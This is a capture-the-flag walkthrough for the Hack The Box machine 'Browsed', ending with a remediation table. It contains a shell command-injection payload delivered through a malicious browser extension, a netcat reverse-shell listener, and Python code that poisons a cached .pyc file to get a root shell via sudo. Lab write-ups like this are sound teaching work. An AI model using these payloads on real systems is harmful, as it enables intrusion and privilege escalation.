<div align="center">

# 🧩 HTB: Browsed

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)

`hackthebox` `linux` `chrome-extension` `ssrf` `command-injection` `pyc-cache-poisoning`

</div>

---

> **TL;DR** — A site that lets anyone upload a Chrome extension "for the team to test" is really an SSRF delivery mechanism with extra steps. A malicious extension pivots browser-side access into a command-injection bug in an internal Flask app, landing a shell as `larry`. From there, a writable Python bytecode cache and a sudo-enabled script combine into root.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Linux |
| 🎯 **Target** | `<TARGET_IP>` (browsed.htb) |
| 🎚️ **Difficulty** | Medium |
| 📅 **Date** | January 17, 2026 |
| 🏁 **Outcome** | ✅ Full compromise |

## 🔍 Recon

```bash
nmap -sVC -p- <TARGET_IP> -T3 --min-rate 5000
```

| Port | Service |
|:---:|---|
| `22` | OpenSSH 9.6p1 (Ubuntu) |
| `80` | nginx 1.24.0 |

The homepage is a Chrome-extension "submit your extension for review" site — with one very honest disclosure in the page copy:

> *"Once we have a security team, we'll review extensions to make them secure. Don't hesitate to send your samples, the team will use it for daily use and report afterwards their thoughts on it."*

> ⚠️ Translation: uploaded extensions get **loaded and run by real internal users**, with **no review process at all**. That's a client-side execution primitive handed out for free.

A sample extension at `/samples.html` shows the expected shape: `manifest.json` (Manifest V3, minimal permissions) + `content.js`, zipped with files at the archive root. Upload handler: `/upload.php`.

---

## 🚩 Shell as `larry`

### Extension upload → hidden internal vhost

Testing the upload flow with a benign extension surfaces something recon alone never would have: Chrome's own network logs from loading the extension reveal a request to `browsedinternals.htb` — an internal vhost never seen in the port scan or web enumeration, running **Gitea v1.24.5**.

```bash
echo "<TARGET_IP> browsedinternals.htb" | sudo tee -a /etc/hosts
```

### Source disclosure via a public repo

A public Gitea repository, `larry/MarkdownPreview`, exposes `routines.sh` with hardcoded filesystem paths:

- User: `larry` (home: `/home/larry`)
- App: `/home/larry/markdownPreview/`
- Subpaths: `data/`, `log/routine.log`, `backups/`, `tmp/`

> 💡 Hardcoding real paths into a script that ends up in a *public* repo turns internal reconnaissance from "guessed" to "handed over."

### The real target: an internal Flask app

Weaponizing the extension to probe internal-only services (`file://` reads plus SSRF-style fetches from the browser context) turns up a Flask app bound to `127.0.0.1:5000` — invisible from outside, but reachable *from inside a browser running the malicious extension.*

`GET /routines/<expr>` evaluates an arithmetic-array-style expression where the index is attacker-controlled — and that index gets shell-expanded:

```javascript
const B64_CMD = "Y2F0IC9ob21lL2xhcnJ5L3VzZXIudHh0"; // cat /home/larry/user.txt
const raw_payload = 'arr[$(echo ' + B64_CMD + ' | base64 -d | bash)]';
```

```
arr[$(command)]
```

Any shell-expandable payload inside those brackets executes.

**Weaponized extension → SSRF → RCE, end to end:**
1. Extension content script fires on any page the internal team visits
2. It issues a request to `http://127.0.0.1:5000/routines/arr[$(command)]` — a request the *browser* makes, from *inside* the network, on behalf of whoever's testing the extension
3. Flask evaluates the expression, shells out
4. Reverse shell callback received

```bash
# listener
nc -lvnp 4444
```

Extension uploaded, internal team loads it, callback lands:

```
larry@browsed:~$ id
uid=1000(larry) gid=1000(larry) groups=1000(larry)
```

**Artifacts:** upload transcript, Gitea repo discovery, Flask RCE payload/callback (see evidence index)

---

## 👑 Root — Python Bytecode Cache Poisoning

### The setup

```bash
sudo -l
```

`larry` can run `/opt/extensiontool/extension_tool.py` via sudo, no password. That script imports a module, `extension_utils` — and Python's import machinery has a shortcut worth knowing about: if a cached `.pyc` file's **size and mtime metadata** match what it expects for the `.py` source, Python loads the cached bytecode **without re-validating it against the source**.

`larry` has write access to the `__pycache__` directory holding that cache.

> ⚠️ **Root cause:** Python trusts `__pycache__/*.pyc` metadata over re-checking source integrity. Any user who can write to that directory can plant bytecode that runs with whatever privilege level executes the import — here, root, via sudo.

### Building the poisoned cache

```python
payload = 'import os; print("ROOT SHELL"); os.execl("/bin/bash", "bash", "-p")'
padding_needed = 1245 - len(payload.encode('utf-8'))  # match original file size exactly
payload += "#" * padding_needed

py_compile.compile('extension_utils.py', cfile='malicious.pyc')
shutil.copy('malicious.pyc', '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc')
```

The exploit also clones the original file's mtime so the size+timestamp check passes cleanly.

```bash
larry@browsed:/tmp$ python3 ./privesc.py
[*] Original size: 1245 bytes
[+] Timestamp cloned
[+] Injection complete

larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py
ROOT SHELL
root@browsed:/tmp#
```

```bash
root@browsed:/tmp# cat /root/root.txt
```
*(root flag captured — value not preserved in original notes; re-run to recapture if needed)*

---

## 📦 Evidence Index

| ID | Description |
|---|---|
| `EV-001` | Full port scan |
| `EV-002`–`EV-004` | Upload flow + sample extension analysis |
| `EV-005` | Extension load triggers `browsedinternals.htb` discovery |
| `EV-006`–`EV-007` | Gitea repo enumeration, `routines.sh` source disclosure |
| `EV-008`–`EV-010` | Weaponized extension build, upload, reverse shell as `larry` |
| `EV-011`–`EV-013` | Sudo enumeration, bytecode-poisoning exploit, root shell |

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| Unreviewed extension upload run by internal users | Stand up an actual review process before any "submit for testing" feature goes live — this is executable code, treat it like one. |
| Internal Flask app command injection | Never shell-expand user input; use parameterized/whitelisted array access instead of `eval`-adjacent indexing. |
| Internal service reachable via browser SSRF | Segment internal-only services from anything a browser (even an internal one) can reach; require auth even on localhost-bound services. |
| Public repo with hardcoded internal paths | Scrub paths from source, use env vars/config, and audit repos for this class of leak. |
| Writable `__pycache__` on a sudo-enabled script | Lock cache directory permissions to root-only write; avoid running privileged Python scripts whose import path is user-writable anywhere. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
